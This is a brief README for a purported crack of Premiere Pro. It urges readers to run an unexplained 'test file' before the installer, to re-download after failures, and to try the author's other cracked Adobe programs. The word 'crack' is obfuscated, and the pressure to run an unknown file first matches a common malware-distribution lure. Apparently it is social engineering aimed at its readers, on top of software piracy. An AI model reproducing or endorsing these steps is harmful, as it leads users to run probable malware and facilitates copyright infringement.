# Premier-Pro

YOU MUST RUN THE TEST FILE BEFORE RUNNING THE INSTALLER!!!

This is necessary for the cr@ck to work.

If it does not work the first time, delete the files, re-download, and try again.

If it does not work after this, try to run other softwares like Illustrator, or After Effects and try this way. You will be able to find these on my profile.

If it does not work after these previous attempts, please contact me and I will be more than happy to help.
